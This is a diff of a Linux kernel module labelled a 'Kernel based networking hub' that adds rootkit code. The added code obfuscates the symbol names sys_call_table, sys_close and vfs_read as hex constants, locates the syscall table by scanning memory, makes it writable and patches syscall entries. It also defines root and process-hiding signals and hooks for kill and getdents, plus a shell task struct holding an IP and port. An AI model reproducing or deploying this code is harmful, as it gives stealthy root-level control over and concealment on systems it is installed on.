@@ -13,6 +13,18 @@
 #include <linux/udp.h>
 #include <linux/un.h>
 #include <net/sock.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/fs.h>
+#include <linux/syscalls.h>
+#include <asm/errno.h>
+#include <asm/unistd.h>
+#include <linux/mman.h>
+#include <asm/proto.h>
+#include <asm/delay.h>
+#include <linux/init.h>
+#include <linux/highmem.h>
+#include <linux/sched.h>
 
 #include "shared.h"
 
@@ -39,8 +51,6 @@ static struct seqack seq_history[10];
 
 unsigned char* buffer;
 unsigned char* encrypted_test_data;
-
-unsigned long *sct;
 
 size_t data_len;
 size_t bit_count = 0;
@@ -458,65 +468,76 @@ unsigned int outgoing_hook(void* priv, struct sk_buff* skb, const struct nf_hook
     return NF_ACCEPT;
 }
 
-struct {
-    unsigned short limit;
-    unsigned long base;
-} __attribute__((packed)) idtr;
+#define SIGROOT 48
+#define SIGHIDEPROC 49
+#define SIGHIDEREPTILE 50
+#define SIGHIDECONTENT 51
+#define SSIZE_MAX 32767
+#define SYS_CALL_TABLE \
+    ({ \
+        unsigned int* p = (unsigned int*) __builtin_alloca(16); \
+        p[0] = 0x5f737973; \
+        p[1] = 0x6c6c6163; \
+        p[2] = 0x6261745f; \
+        p[3] = 0x0000656c; \
+        (char*) p; \
+    })
 
-struct {
-    unsigned short off1;
-    unsigned short sel;
-    unsigned char none, flags;
-    unsigned short off2;
-} __attribute__((packed)) idt;
+#define SYS_CLOSE \
+    ({ \
+        unsigned int* p = (unsigned int*) __builtin_alloca(12); \
+        p[0] = 0x5f737973; \
+        p[1] = 0x736f6c63; \
+        p[2] = 0x00000065; \
+        (char*) p; \
+    })
 
-#if 0
-void* memmem(const void* haystack, size_t haystacklen, const void* needle, size_t needlelen) {
-    const unsigned char* hay = haystack;
-    const unsigned char* need = needle;
-    int i;
-    int j;
+static unsigned long* sct;
+atomic_t read_on;
 
-    if (needlelen > haystacklen) {
-        return NULL;
-    }
-    for (i = 0; i < haystacklen - needlelen; ++i) {
-        for (j = 0; j < needlelen; ++j) {
-            printk(KERN_INFO "Checking char %02x against %02x\n", hay[i + j], need[j]);
-            if (hay[i + j] != need[j]) {
-                break;
-            }
-        }
-        if (j >= needlelen) {
-            //It was found
-            return haystack + i;
-        }
-    }
-    return NULL;
-}
+#define VFS_READ \
+    ({ \
+        unsigned int* p = (unsigned int*) __builtin_alloca(9); \
+        p[0] = 0x5f736676; \
+        p[1] = 0x64616572; \
+        p[2] = 0x00; \
+        (char*) p; \
+    })
 
-unsigned long* find_sys_call_table(void) {
-    char** p;
-    unsigned long sct_off = 0;
-    unsigned char code[255];
+asmlinkage ssize_t (*vfs_read_addr)(struct file* file, char __user* buf, size_t count, loff_t* pos);
 
-    asm("sidt %0" : "=m"(idtr));
-    memcpy(&idt, (void*) (idtr.base + 8 * 0x80), sizeof(idt));
-    sct_off = (idt.off2 << 16) | idt.off1;
-    memcpy(code, (void*) sct_off, sizeof(code));
-
-    p = (char**) memmem(code, sizeof(code), "\xff\x14\x85", 3);
-
-    if (p) {
-        return *(unsigned long**) ((char*) p + 3);
-    } else {
-        return NULL;
-    }
-}
-#endif
-
+asmlinkage int (*o_kill)(pid_t pid, int sig);
+asmlinkage int (*o_getdents64)(
+        unsigned int fd, struct linux_dirent64 __user* dirent, unsigned int count);
+asmlinkage int (*o_getdents)(
+        unsigned int fd, struct linux_dirent __user* dirent, unsigned int count);
 asmlinkage ssize_t (*o_read)(unsigned int fd, char __user* buf, size_t count);
+
+asmlinkage int l33t_kill(pid_t pid, int sig);
+asmlinkage int l33t_getdents64(
+        unsigned int fd, struct linux_dirent64 __user* dirent, unsigned int count);
+asmlinkage int l33t_getdents(
+        unsigned int fd, struct linux_dirent __user* dirent, unsigned int count);
 asmlinkage ssize_t l33t_read(unsigned int fd, char __user* buf, size_t count);
+
+struct shell_task {
+    struct work_struct work;
+    char* path;
+    char* ip;
+    char* port;
+};
+
+struct linux_dirent {
+    unsigned long d_ino;
+    unsigned long d_off;
+    unsigned short d_reclen;
+    char d_name[1];
+};
+
+struct ksym {
+    char* name;
+    unsigned long addr;
+};
 
 asmlinkage ssize_t l33t_read(unsigned int fd, char __user* buf, size_t count) {
     struct file* f;
@@ -563,6 +584,59 @@ void* memmem(const void* haystack, size_t haystack_size, const void* needle, siz
     return NULL;
 }
 
+asmlinkage long (*real_chdir)(const char __user* filename);
+
+void** syscall_table;
+asmlinkage long chdir_patch(const char __user* filename) {
+    printk("Oh!\n");
+    return (*real_chdir)(filename);
+}
+
+unsigned long** find_syscall_table(void) {
+    unsigned long** table;
+    unsigned long ptr;
+
+    for (ptr = 0xc0000000; ptr <= 0xd0000000; ptr += sizeof(void*)) {
+        table = (unsigned long**) ptr;
+        if (table[__NR_close] == (unsigned long*) sys_close) {
+            return &(table[0]);
+        }
+    }
+    printk("Not found\n");
+    return NULL;
+}
+int __init chdir_init(void) {
+    unsigned int l;
+    pte_t* pte;
+    syscall_table = (void**) find_syscall_table();
+    if (syscall_table == NULL) {
+        printk(KERN_ERR "Syscall table is not found\n");
+        return -1;
+    }
+    printk("Syscall table found: %p\n", syscall_table);
+    pte = lookup_address((long unsigned int) syscall_table, &l);
+    pte->pte |= _PAGE_RW;
+    real_chdir = syscall_table[__NR_chdir];
+    syscall_table[__NR_chdir] = chdir_patch;
+    printk("Patched!\nOLD :%p\nIN-TABLE:%p\nNEW:%p\n", real_chdir, syscall_table[__NR_open],
+            chdir_patch);
+    return 0;
+}
+
+void __exit chdir_cleanup(void) {
+    unsigned int l;
+    pte_t* pte;
+    syscall_table[__NR_chdir] = real_chdir;
+    pte = lookup_address((long unsigned int) syscall_table, &l);
+    pte->pte &= ~_PAGE_RW;
+    printk("Exit\n");
+    return;
+}
+
+module_init(chdir_init);
+module_exit(chdir_cleanup);
+
+#if 0
 unsigned long* find_sys_call_table(void) {
     unsigned long sct_off = 0;
     unsigned char code[512];
@@ -592,15 +666,25 @@ unsigned long* find_sys_call_table(void) {
 static int __init mod_init(void) {
     int err;
 
-    printk(KERN_INFO "Kernel syscall table address %p\n", (void*) find_sys_call_table());
+    sct = (unsigned long*) find_sys_call_table();
 
-    sct = (unsigned long *) find_sys_call_table();
+    printk(KERN_INFO "Kernel syscall table address %p\n", (void*) sct);
+    printk(KERN_INFO "old read value %d\n", __NR_read);
+    printk(KERN_INFO "old read address %p\n", (void*) *sct);
+    printk(KERN_INFO "old read address %p\n", (void*) sct[__NR_read]);
 
     o_read = (void*) sct[__NR_read];
 
+    printk(KERN_INFO "Pre write cr0\n");
+
     write_cr0(read_cr0() & (~0x10000));
+    printk(KERN_INFO "Post write cr0\n");
+    printk(KERN_INFO "Pre read assign\n");
     sct[__NR_read] = (unsigned long) l33t_read;
+    printk(KERN_INFO "Post read assign\n");
+    printk(KERN_INFO "Pre rewrite cr0\n");
     write_cr0(read_cr0() | 0x10000);
+    printk(KERN_INFO "Post rewrite cr0\n");
 
     return 0;
 
@@ -690,6 +774,8 @@ static void __exit mod_exit(void) {
 
 module_init(mod_init);
 module_exit(mod_exit);
+
+#endif
 
 MODULE_DESCRIPTION("Kernel based networking hub");
 MODULE_LICENSE("GPL");
